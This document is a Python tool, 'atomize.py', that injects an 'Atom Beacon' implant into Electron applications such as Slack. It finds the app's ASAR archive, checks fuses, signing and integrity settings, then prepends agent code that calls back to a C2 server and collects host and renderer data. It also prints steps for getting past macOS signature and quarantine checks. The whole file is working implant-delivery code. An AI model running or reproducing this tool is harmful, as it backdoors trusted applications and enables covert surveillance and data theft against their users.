#!/usr/bin/env python3
"""
Atom Beacon Patcher — Patches Electron apps with the Atom Beacon implant.

Extracts an Electron app's ASAR archive (or works on unpacked app directories),
finds the main process entry point, prepends the Atom Beacon agent bootstrap,
and repacks. The patched app registers with a JS-Tap server on launch and
provides full host-level + renderer-level data collection.

Usage:
    python3 atomize.py [options] <path-to-electron-app-or-asar>

Options:
    --server URL        C2 server URL (required for patching)
    --tag TAG           Client tag (default: "atom")
    --detect-only       Analyze without patching
    --no-backup         Skip creating .bak of original asar
    --output PATH       Output patched asar to different path (default: in-place)
"""

import argparse
import json
import os
import platform
import re
import secrets
import shutil
import subprocess
import sys
import tempfile

import asar


# When frozen by PyInstaller, bundled data files are extracted to sys._MEIPASS
if getattr(sys, 'frozen', False):
    SCRIPT_DIR = sys._MEIPASS
else:
    SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
PAYLOAD_DIR = os.path.join(SCRIPT_DIR, 'payload')


def find_asar(target_path):
    """Locate the app.asar or app/ directory from a given path.

    Accepts:
      - Direct path to an app.asar file
      - Path to an unpacked app/ directory
      - Path to an Electron app bundle (macOS .app, or install directory)

    Returns:
        tuple: (asar_path_or_app_dir, is_asar) where is_asar is True
               if it's a .asar file, False if it's an unpacked directory.

    Raises:
        FileNotFoundError: If no ASAR or app directory can be found.
    """
    target_path = os.path.abspath(target_path)

    # Direct path to .asar file
    if target_path.endswith('.asar') and os.path.isfile(target_path):
        return target_path, True

    # Direct path to unpacked app directory
    if os.path.isdir(target_path) and os.path.isfile(os.path.join(target_path, 'package.json')):
        return target_path, False

    # Search for resources/app.asar or resources/app/ within the target
    search_paths = []

    if platform.system() == 'Darwin' and target_path.endswith('.app'):
        # macOS app bundle: App.app/Contents/Resources/
        search_paths.append(os.path.join(target_path, 'Contents', 'Resources'))
    else:
        # Linux/Windows: look for resources/ directory
        search_paths.append(os.path.join(target_path, 'resources'))
        # Also check if target IS the resources directory
        if os.path.basename(target_path) == 'resources':
            search_paths.append(target_path)

    for search_path in search_paths:
        asar_file = os.path.join(search_path, 'app.asar')
        if os.path.isfile(asar_file):
            return asar_file, True

        app_dir = os.path.join(search_path, 'app')
        if os.path.isdir(app_dir) and os.path.isfile(os.path.join(app_dir, 'package.json')):
            return app_dir, False

    raise FileNotFoundError(
        f"Could not find app.asar or app/ directory in '{target_path}'.\n"
        f"Searched: {', '.join(search_paths) if search_paths else 'no valid search paths'}\n"
        f"Provide a direct path to the .asar file, app/ directory, or app bundle."
    )


def read_package_json(target_path, is_asar):
    """Read and parse package.json from the target.

    Returns:
        dict: Parsed package.json contents.
    """
    if is_asar:
        data = asar.extract_file(target_path, 'package.json')
        return json.loads(data.decode('utf-8'))
    else:
        pkg_path = os.path.join(target_path, 'package.json')
        with open(pkg_path, 'r') as f:
            return json.load(f)


def read_entry_file(target_path, is_asar, entry_point):
    """Read the main entry point file contents.

    Returns:
        str: File contents as string.
    """
    if is_asar:
        data = asar.extract_file(target_path, entry_point)
        return data.decode('utf-8')
    else:
        file_path = os.path.join(target_path, entry_point)
        with open(file_path, 'r') as f:
            return f.read()


def detect_security_settings(source_code):
    """Scan source code for Electron security-relevant settings.

    Returns:
        dict: Detected settings and their values/contexts.
    """
    settings = {}

    patterns = {
        'nodeIntegration': r'nodeIntegration\s*:\s*(true|false)',
        'contextIsolation': r'contextIsolation\s*:\s*(true|false)',
        'sandbox': r'sandbox\s*:\s*(true|false)',
        'webSecurity': r'webSecurity\s*:\s*(true|false)',
        'allowRunningInsecureContent': r'allowRunningInsecureContent\s*:\s*(true|false)',
        'enableRemoteModule': r'enableRemoteModule\s*:\s*(true|false)',
    }

    for setting, pattern in patterns.items():
        match = re.search(pattern, source_code)
        if match:
            settings[setting] = match.group(1)
        else:
            settings[setting] = '(default)'

    # Check for CSP
    if 'Content-Security-Policy' in source_code or 'content-security-policy' in source_code:
        settings['csp_in_code'] = True
    else:
        settings['csp_in_code'] = False

    # Check for preload scripts
    preload_match = re.search(r'preload\s*:\s*[\'"`]([^\'"`]+)[\'"`]', source_code)
    if preload_match:
        settings['preload'] = preload_match.group(1)
    elif re.search(r'preload\s*:', source_code):
        settings['preload'] = '(dynamic/computed path)'
    else:
        settings['preload'] = None

    # Check for debug port stripping (--inspect, --remote-debugging-port)
    debug_switches = {
        'inspect': False,
        'inspect-brk': False,
        'remote-debugging-port': False,
    }
    for switch in debug_switches:
        # Match removeSwitch('inspect'), removeSwitch("inspect"), etc.
        # Also match appendSwitch patterns that disable debugging
        if re.search(r'removeSwitch\s*\(\s*[\'"`]' + re.escape(switch) + r'[\'"`]\s*\)', source_code):
            debug_switches[switch] = True
    settings['debug_switches_stripped'] = debug_switches

    return settings


def check_code_signing(target_path):
    """Check code signing status of the app.

    Returns:
        dict: Signing information.
    """
    result = {'signed': False, 'details': ''}
    system = platform.system()

    if system == 'Darwin':
        # Check for .app bundle (go up from resources/app.asar to the .app)
        app_bundle = target_path
        while app_bundle and not app_bundle.endswith('.app'):
            parent = os.path.dirname(app_bundle)
            if parent == app_bundle:
                break
            app_bundle = parent

        if app_bundle.endswith('.app'):
            try:
                proc = subprocess.run(
                    ['codesign', '-v', '--verbose', app_bundle],
                    capture_output=True, text=True, timeout=10
                )
                if proc.returncode == 0:
                    result['signed'] = True
                    result['details'] = 'Valid code signature detected'
                else:
                    result['details'] = proc.stderr.strip() or 'No valid signature'
            except (FileNotFoundError, subprocess.TimeoutExpired):
                result['details'] = 'Could not check (codesign not available)'
        else:
            result['details'] = 'Not a .app bundle — skipped signature check'

    elif system == 'Windows':
        result['details'] = 'Windows signing check not implemented — patch will work post-install regardless'

    else:
        result['details'] = 'Linux — no code signing enforcement'

    return result


def check_electron_fuses(target_path):
    """Check Electron fuses in the app's binary.

    Fuses are binary-level flags embedded in the Electron executable that control
    security features like --inspect access. These override any JS-level settings.

    Returns:
        dict: Fuse information including individual fuse states.
    """
    result = {'found': False, 'fuses': {}, 'binary_path': None}

    SENTINEL = b'dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX'
    FUSE_NAMES = [
        'RunAsNode',
        'EnableCookieEncryption',
        'EnableNodeOptionsEnvironmentVariable',
        'EnableNodeCliInspectArguments',
        'EnableEmbeddedAsarIntegrityValidation',
        'OnlyLoadAppFromAsar',
        'LoadBrowserProcessSpecificV8Snapshot',
        'GrantFileProtocolExtraPrivileges',
    ]

    # Find the Electron binary — go up from resources/app.asar to the app dir
    app_dir = target_path
    for _ in range(3):
        parent = os.path.dirname(app_dir)
        if parent == app_dir:
            break
        # Check if parent has resources/ (meaning we've gone one too far)
        if os.path.basename(app_dir) == 'resources':
            app_dir = parent
            break
        app_dir = parent

    # Look for ELF/Mach-O executables in the app directory
    binary_path = None
    try:
        for entry in os.listdir(app_dir):
            full_path = os.path.join(app_dir, entry)
            if not os.path.isfile(full_path) or not os.access(full_path, os.X_OK):
                continue
            # Skip obvious non-binaries
            if entry.endswith(('.sh', '.py', '.js', '.json', '.pak', '.dat', '.so', '.node')):
                continue
            # Check file header for ELF or Mach-O
            try:
                with open(full_path, 'rb') as f:
                    header = f.read(4)
                if header[:4] == b'\x7fELF' or header[:4] in (b'\xfe\xed\xfa\xce', b'\xfe\xed\xfa\xcf', b'\xce\xfa\xed\xfe', b'\xcf\xfa\xed\xfe'):
                    # Check if this binary contains the fuse sentinel
                    with open(full_path, 'rb') as f:
                        data = f.read()
                    if SENTINEL in data:
                        binary_path = full_path
                        break
            except (PermissionError, OSError):
                continue
    except OSError:
        return result

    if not binary_path:
        return result

    result['binary_path'] = binary_path

    with open(binary_path, 'rb') as f:
        data = f.read()

    idx = data.find(SENTINEL)
    if idx == -1:
        return result

    result['found'] = True
    fuse_start = idx + len(SENTINEL)

    for i, name in enumerate(FUSE_NAMES):
        byte_offset = fuse_start + 1 + i
        if byte_offset >= len(data):
            break
        byte = data[byte_offset]
        if byte == 0x31:    # ASCII '1'
            result['fuses'][name] = 'ENABLED'
        elif byte == 0x30:  # ASCII '0'
            result['fuses'][name] = 'DISABLED'
        elif byte == 0x72:  # ASCII 'r'
            result['fuses'][name] = 'DEFAULT'
        else:
            result['fuses'][name] = f'UNKNOWN (0x{byte:02x})'

    return result


def check_asar_integrity(target_path):
    """Check if ASAR integrity validation might be enabled.

    Returns:
        dict: Integrity check results.
    """
    result = {'integrity_found': False, 'details': ''}

    if platform.system() != 'Darwin':
        result['details'] = 'ASAR integrity check only relevant on macOS'
        return result

    # Look for Info.plist with ElectronAsarIntegrity
    app_bundle = target_path
    while app_bundle and not app_bundle.endswith('.app'):
        parent = os.path.dirname(app_bundle)
        if parent == app_bundle:
            break
        app_bundle = parent

    if not app_bundle.endswith('.app'):
        result['details'] = 'Not a .app bundle — cannot check Info.plist'
        return result

    plist_path = os.path.join(app_bundle, 'Contents', 'Info.plist')
    if not os.path.isfile(plist_path):
        result['details'] = 'No Info.plist found'
        return result

    try:
        with open(plist_path, 'rb') as f:
            content = f.read()
        if b'ElectronAsarIntegrity' in content:
            result['integrity_found'] = True
            result['details'] = 'ElectronAsarIntegrity key found in Info.plist — patching may break integrity validation'
        else:
            result['details'] = 'No ASAR integrity entry in Info.plist'
    except Exception as e:
        result['details'] = f'Could not read Info.plist: {e}'

    return result


def is_minified(source_code):
    """Heuristic check for whether source code is minified/bundled."""
    lines = source_code.split('\n')
    if len(lines) == 0:
        return False
    # If fewer than 20 lines or average line length > 200, likely minified
    if len(lines) < 20:
        return True
    avg_length = sum(len(line) for line in lines) / len(lines)
    return avg_length > 200


def detect_esm(pkg, entry_point):
    """Detect whether the entry point uses ESM (ES Modules).

    Returns True if the entry point is ESM based on:
      - package.json "type": "module"
      - Entry point has .mjs extension

    Returns:
        bool: True if ESM, False if CJS.
    """
    if entry_point and entry_point.endswith('.mjs'):
        return True
    if pkg.get('type') == 'module':
        return True
    return False


def detect(target_path, is_asar):
    """Run detection phase — analyze the Electron app structure.

    Returns:
        dict: Detection results.
    """
    results = {
        'target': target_path,
        'is_asar': is_asar,
        'entry_point': None,
        'is_esm': False,
        'format': None,
        'security_settings': {},
        'signing': {},
        'integrity': {},
        'warnings': [],
    }

    # Read package.json
    try:
        pkg = read_package_json(target_path, is_asar)
    except Exception as e:
        results['warnings'].append(f'Failed to read package.json: {e}')
        return results

    # Find entry point
    entry_point = pkg.get('main', 'index.js')
    results['entry_point'] = entry_point

    # Detect ESM vs CJS
    results['is_esm'] = detect_esm(pkg, entry_point)

    # Read entry point source
    try:
        source = read_entry_file(target_path, is_asar, entry_point)
    except Exception as e:
        results['warnings'].append(f'Failed to read entry point "{entry_point}": {e}')
        return results

    # Determine format
    if is_minified(source):
        results['format'] = 'Minified/bundled'
    else:
        results['format'] = 'Readable source'

    # Scan for security settings
    results['security_settings'] = detect_security_settings(source)

    # Check code signing
    results['signing'] = check_code_signing(target_path)

    # Check ASAR integrity
    if is_asar:
        results['integrity'] = check_asar_integrity(target_path)

    # Check Electron fuses
    results['fuses'] = check_electron_fuses(target_path)

    # Warnings
    if results['signing'].get('signed'):
        results['warnings'].append('Code signature detected — patching will invalidate it')

    if results.get('integrity', {}).get('integrity_found'):
        results['warnings'].append('ASAR integrity entry found — may need to update hash after patching')

    # Check if already patched
    if '/* atom-beacon-bootstrap */' in source:
        results['warnings'].append('Entry point appears to already be patched (atom-beacon-bootstrap marker found)')

    return results


def print_report(results):
    """Print a formatted detection report."""
    print()
    print(f"  Target:  {results['target']}")
    print(f"  Format:  {'ASAR archive' if results['is_asar'] else 'Unpacked directory'}")

    if results['entry_point']:
        format_note = f" ({results['format']})" if results['format'] else ''
        print(f"  Entry:   {results['entry_point']}{format_note}")
        module_type = 'ESM' if results.get('is_esm') else 'CJS'
        print(f"  Module:  {module_type}")

    settings = results.get('security_settings', {})
    if settings:
        print()
        print("  Security Settings Detected:")
        for key in ['nodeIntegration', 'contextIsolation', 'sandbox', 'webSecurity']:
            value = settings.get(key, '(default)')
            print(f"    {key:30s} {value}")
        if settings.get('csp_in_code'):
            print(f"    {'CSP':30s} Found in source code")
        if settings.get('preload'):
            print(f"    {'preload':30s} {settings['preload']}")

    # Electron Fuses (binary-level)
    fuse_data = results.get('fuses', {})
    if fuse_data.get('found'):
        print()
        print(f"  Electron Fuses ({os.path.basename(fuse_data['binary_path'])}):")
        inspect_fuse = fuse_data['fuses'].get('EnableNodeCliInspectArguments', 'UNKNOWN')
        node_opts_fuse = fuse_data['fuses'].get('EnableNodeOptionsEnvironmentVariable', 'UNKNOWN')
        run_as_node = fuse_data['fuses'].get('RunAsNode', 'UNKNOWN')
        asar_integrity = fuse_data['fuses'].get('EnableEmbeddedAsarIntegrityValidation', 'UNKNOWN')
        only_asar = fuse_data['fuses'].get('OnlyLoadAppFromAsar', 'UNKNOWN')

        for name, state in fuse_data['fuses'].items():
            marker = ''
            if name == 'EnableNodeCliInspectArguments' and state == 'DISABLED':
                marker = '  ** --inspect blocked'
            elif name == 'EnableNodeOptionsEnvironmentVariable' and state == 'DISABLED':
                marker = '  ** NODE_OPTIONS blocked'
            elif name == 'OnlyLoadAppFromAsar' and state == 'ENABLED':
                marker = '  ** must patch ASAR (no loose files)'
            print(f"    {name:45s} {state}{marker}")

        # Summary verdict on runtime injection
        print()
        if inspect_fuse == 'DISABLED':
            print("  Runtime Injection:  BLOCKED — --inspect fuse disabled, ASAR patching required")
        elif inspect_fuse in ('ENABLED', 'DEFAULT'):
            print("  Runtime Injection:  POSSIBLE — --inspect fuse enabled, can inject via debug port")
        else:
            print(f"  Runtime Injection:  UNCERTAIN — --inspect fuse state: {inspect_fuse}")
    else:
        print()
        print("  Electron Fuses: Not found in binary")
        # Fall back to source-level analysis
        stripped = settings.get('debug_switches_stripped', {}) if settings else {}
        if any(stripped.values()):
            print("  Source-Level Debug Stripping:")
            for switch, is_stripped in stripped.items():
                status = 'STRIPPED' if is_stripped else 'Not stripped'
                print(f"    --{switch:28s} {status}")
        else:
            print("  Runtime Injection:  UNCERTAIN — no fuses found, no source-level stripping detected")

    signing = results.get('signing', {})
    if signing.get('details'):
        print()
        print(f"  Signing: {signing['details']}")

    integrity = results.get('integrity', {})
    if integrity.get('details'):
        print(f"  Integrity: {integrity['details']}")

    warnings = results.get('warnings', [])
    if warnings:
        print()
        print("  Warnings:")
        for w in warnings:
            print(f"    [!] {w}")

    print()


def generate_bootstrap(server_url, tag, ipc_prefix, is_esm=False):
    """Generate the bootstrap code to prepend to the entry point.

    Reads atom-agent.js template and embeds configuration values.
    The renderer payload (atom-telemlib.js) is embedded as a string
    constant inside the agent.

    If is_esm is True, prepends an ESM shim that creates a CJS-compatible
    require() function using import.meta.url, so the agent's require() calls
    work in ES module entry points.

    Returns:
        str: The complete bootstrap code ready to prepend.
    """
    # Read main process agent template
    agent_path = os.path.join(PAYLOAD_DIR, 'atom-agent.js')
    with open(agent_path, 'r') as f:
        agent_code = f.read()

    # Read renderer payload template
    telemlib_path = os.path.join(PAYLOAD_DIR, 'atom-telemlib.js')
    with open(telemlib_path, 'r') as f:
        telemlib_code = f.read()

    # Replace template variables in renderer payload
    telemlib_code = telemlib_code.replace('__ATOM_IPC_PREFIX__', ipc_prefix)

    # Escape the renderer payload for embedding as a JS string
    # Use JSON.stringify-style escaping (handles newlines, quotes, backslashes)
    telemlib_escaped = json.dumps(telemlib_code)

    # Replace template variables in agent
    agent_code = agent_code.replace("'__ATOM_SERVER_URL__'", f"'{server_url}'")
    agent_code = agent_code.replace("'__ATOM_TAG__'", f"'{tag}'")
    agent_code = agent_code.replace("'__ATOM_IPC_PREFIX__'", f"'{ipc_prefix}'")
    agent_code = agent_code.replace("'__ATOM_RENDERER_PAYLOAD__'", telemlib_escaped)

    # Build ESM shim if needed
    esm_shim = ''
    if is_esm:
        esm_shim = (
            "import { createRequire as __atomCR } from 'module';\n"
            "const require = __atomCR(import.meta.url);\n"
        )

    # Wrap in markers for detection
    bootstrap = f"/* atom-beacon-bootstrap */\n{esm_shim}{agent_code}\n/* end-atom-beacon-bootstrap */\n"
    return bootstrap


def patch_asar(target_path, server_url, tag, backup=True, output_path=None):
    """Patch an ASAR archive with the Atom Beacon agent.

    Uses in-place file patching to preserve unpacked file references
    and other header metadata (integrity hashes, links, etc.).

    Args:
        target_path: Path to the .asar file.
        server_url: C2 server URL.
        tag: Client tag.
        backup: Whether to create a .bak backup.
        output_path: Optional output path (default: in-place).
    """
    ipc_prefix = '__ax' + secrets.token_hex(4)

    # Read package.json to find entry point
    pkg = read_package_json(target_path, True)
    entry_point = pkg.get('main', 'index.js')

    # Detect ESM
    is_esm = detect_esm(pkg, entry_point)
    if is_esm:
        print(f"  [*] ESM entry point detected — will inject require() shim")

    # Read original entry file
    original_source = read_entry_file(target_path, True, entry_point)

    # Check for existing patch
    if '/* atom-beacon-bootstrap */' in original_source:
        print("  [!] Entry point already patched. Stripping old patch before re-patching.")
        original_source = strip_existing_patch(original_source)

    # Generate bootstrap
    bootstrap = generate_bootstrap(server_url, tag, ipc_prefix, is_esm=is_esm)

    # Prepend bootstrap to entry point
    patched_source = bootstrap + original_source

    # Create backup
    final_output = output_path or target_path
    if backup and os.path.isfile(final_output):
        backup_path = final_output + '.bak'
        # Remove read-only attribute on existing backup if present (Windows installers set this)
        if os.path.isfile(backup_path):
            os.chmod(backup_path, 0o666)
        shutil.copy2(final_output, backup_path)
        print(f"  Backup: {backup_path}")

    # Strip read-only attribute on target so we can overwrite it (Windows installers set this)
    if os.path.isfile(final_output):
        os.chmod(final_output, 0o666)

    # Patch the single entry file in-place (preserves unpacked refs and header structure)
    print(f"  Patching {entry_point} in {target_path}...")
    asar.patch_file(target_path, entry_point, patched_source.encode('utf-8'), output_path=final_output)


def patch_directory(target_path, server_url, tag, backup=True, output_path=None):
    """Patch an unpacked app directory with the Atom Beacon agent.

    Args:
        target_path: Path to the app/ directory.
        server_url: C2 server URL.
        tag: Client tag.
        backup: Whether to create a .bak backup of the entry file.
        output_path: Ignored for directory targets (always in-place).
    """
    ipc_prefix = '__ax' + secrets.token_hex(4)

    # Read package.json to find entry point
    pkg = read_package_json(target_path, False)
    entry_point = pkg.get('main', 'index.js')
    entry_file_path = os.path.join(target_path, entry_point)

    if not os.path.isfile(entry_file_path):
        raise FileNotFoundError(f"Entry point not found: {entry_file_path}")

    # Detect ESM
    is_esm = detect_esm(pkg, entry_point)
    if is_esm:
        print(f"  [*] ESM entry point detected — will inject require() shim")

    # Read original entry file
    with open(entry_file_path, 'r') as f:
        original_source = f.read()

    # Check for existing patch
    if '/* atom-beacon-bootstrap */' in original_source:
        print("  [!] Entry point already patched. Stripping old patch before re-patching.")
        original_source = strip_existing_patch(original_source)

    # Generate bootstrap
    bootstrap = generate_bootstrap(server_url, tag, ipc_prefix, is_esm=is_esm)

    # Create backup of the entry file
    if backup:
        backup_path = entry_file_path + '.bak'
        shutil.copy2(entry_file_path, backup_path)
        print(f"  Backup: {backup_path}")

    # Write patched entry point
    patched_source = bootstrap + original_source
    with open(entry_file_path, 'w') as f:
        f.write(patched_source)


def strip_existing_patch(source):
    """Remove an existing atom-beacon-bootstrap block from source code."""
    pattern = r'/\* atom-beacon-bootstrap \*/\n.*?/\* end-atom-beacon-bootstrap \*/\n'
    return re.sub(pattern, '', source, flags=re.DOTALL)


def print_post_patch_guidance():
    """Print OS-specific guidance after patching."""
    system = platform.system()
    print()
    if system == 'Darwin':
        print("  macOS notes:")
        print("    - Code signature is now invalidated.")
        print("    - If the app shows 'damaged' warning, run:")
        print("        xattr -cr /path/to/App.app")
        print("    - Or ad-hoc re-sign:")
        print("        codesign --force --deep --sign - /path/to/App.app")
    elif system == 'Windows':
        print("  Windows notes:")
        print("    - SmartScreen may warn on initial download, but already-installed apps")
        print("      are not re-verified. Patching in place should work without issues.")
    else:
        print("  Linux notes:")
        print("    - No code signing enforcement. The patched app should run normally.")
    print()


def main():
    parser = argparse.ArgumentParser(
        description='Atom Beacon Patcher — Patch Electron apps with JS-Tap implant',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  Analyze an Electron app:
    python3 atomize.py --detect-only /Applications/SomeApp.app

  Patch an ASAR file:
    python3 atomize.py --server https://10.0.0.1:8444 /path/to/app.asar

  Patch with custom tag:
    python3 atomize.py --server https://10.0.0.1:8444 --tag slack /Applications/Slack.app

  Patch an unpacked app directory:
    python3 atomize.py --server https://10.0.0.1:8444 /path/to/resources/app/
        """
    )

    parser.add_argument('target', help='Path to Electron app, .asar file, or app/ directory')
    parser.add_argument('--server', help='C2 server URL (required for patching)')
    parser.add_argument('--tag', default='atom', help='Client tag (default: atom)')
    parser.add_argument('--detect-only', action='store_true', help='Analyze without patching')
    parser.add_argument('--no-backup', action='store_true', help='Skip creating backup')
    parser.add_argument('--output', help='Output path for patched asar (default: in-place)')

    args = parser.parse_args()

    print()
    print("  Atom Beacon Patcher")
    print("  ===================")

    # Locate the target
    try:
        target_path, is_asar = find_asar(args.target)
    except FileNotFoundError as e:
        print(f"\n  Error: {e}")
        sys.exit(1)

    # Run detection
    print()
    print("  [*] Analyzing target...")
    results = detect(target_path, is_asar)
    print_report(results)

    if args.detect_only:
        if not results.get('warnings'):
            print("  Ready to patch. Run without --detect-only to proceed.")
        sys.exit(0)

    # Validate requirements for patching
    if not args.server:
        print("  Error: --server is required for patching.")
        print("  Use --detect-only to analyze without patching.")
        sys.exit(1)

    if not results.get('entry_point'):
        print("  Error: Could not determine entry point. Cannot patch.")
        sys.exit(1)

    # Check that payload files exist
    agent_path = os.path.join(PAYLOAD_DIR, 'atom-agent.js')
    telemlib_path = os.path.join(PAYLOAD_DIR, 'atom-telemlib.js')
    for path in [agent_path, telemlib_path]:
        if not os.path.isfile(path):
            print(f"  Error: Payload file not found: {path}")
            sys.exit(1)

    # Patch
    print(f"  [*] Patching {target_path}...")
    print(f"      Server: {args.server}")
    print(f"      Tag: {args.tag}")
    print(f"      Entry point: {results['entry_point']}")
    print()

    try:
        if is_asar:
            patch_asar(
                target_path,
                args.server,
                args.tag,
                backup=not args.no_backup,
                output_path=args.output
            )
        else:
            patch_directory(
                target_path,
                args.server,
                args.tag,
                backup=not args.no_backup,
                output_path=args.output
            )
    except Exception as e:
        print(f"\n  Error during patching: {e}")
        sys.exit(1)

    output_target = args.output or target_path
    print(f"\n  [+] Successfully patched: {output_target}")
    print_post_patch_guidance()


if __name__ == '__main__':
    main()
